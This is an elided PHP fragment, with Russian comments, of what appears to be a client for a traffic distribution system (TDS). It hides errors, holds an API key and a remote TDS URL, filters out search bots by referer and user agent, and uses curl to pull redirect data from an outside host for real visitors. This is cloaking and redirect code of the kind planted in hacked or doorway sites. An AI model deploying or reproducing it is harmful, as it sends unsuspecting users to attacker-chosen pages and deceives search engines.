...
@error_reporting(0);
$z_id = 'lfn1';//ID группы
$z_api_key_host = 'J76koY5Hgt756KhfgdLN0554Jmn5De1a';//API ключ
$z_url = 'http://pikni.ru/forum/?api=';//ссылка на ТДС (замените только домен)
$z_em_referer = 0;//если пустой реферер - это бот (0/1)
$z_em_useragent = 0;//если пустой юзерагент - это бот (0/1)
...
$z_connect = 0;//тип соединения, file_get_contents или curl (0/1)
	...
	if(($z_bot == $z_empty || $z_rd_bots == 1) && $z_ipuser != $z_empty){
		...
		if(empty($z_ip_serv_seodor) || $z_ipuser != $z_ip_serv_seodor){
			if($z_connect == 0){
				...
				$z_ch = curl_init();
				curl_setopt($z_ch, CURLOPT_TIMEOUT, $z_timeout_connect);
				curl_setopt($z_ch, CURLOPT_URL, $z_data);
				curl_setopt($z_ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($z_ch, CURLOPT_FOLLOWLOCATION, 1);
				$z_api_data = curl_exec($z_ch);
				curl_close($z_ch);
			}
